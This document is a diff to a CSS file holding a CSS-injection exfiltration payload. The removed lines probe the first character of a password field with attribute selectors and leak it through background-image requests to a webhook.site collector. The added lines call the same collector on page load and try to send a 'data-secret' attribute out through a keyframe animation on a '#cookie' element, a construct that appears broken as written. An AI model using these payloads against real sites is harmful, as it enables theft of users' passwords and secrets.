@@ -1,34 +1,13 @@
-@import url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/start");
+/* Try to force-load each char via background URL */
+body {
+  background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/start");
+}
 
-/* Brute force first char of password via CSS attribute selector */
-input[name="password"][value^="a"] { 
-    background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/a"); 
+/* Example using attribute selectors to leak chars */
+@keyframes exfil {
+  from { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/c=" attr(data-secret) ); }
 }
-input[name="password"][value^="b"] { 
-    background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/b"); 
+
+#cookie {
+  animation: exfil 1s infinite;
 }
-input[name="password"][value^="c"] { 
-    background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/c"); 
-}
-input[name="password"][value^="d"] { 
-    background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/d"); 
-}
-input[name="password"][value^="e"] { 
-    background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/e"); 
-}
-input[name="password"][value^="f"] { 
-    background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/f"); 
-}
-input[name="password"][value^="g"] { 
-    background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/g"); 
-}
-input[name="password"][value^="h"] { 
-    background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/h"); 
-}
-input[name="password"][value^="i"] { 
-    background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/i"); 
-}
-input[name="password"][value^="j"] { 
-    background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/j"); 
-}
-/* Continue for all possible chars (a-z, A-Z, 0-9, symbols if needed) */
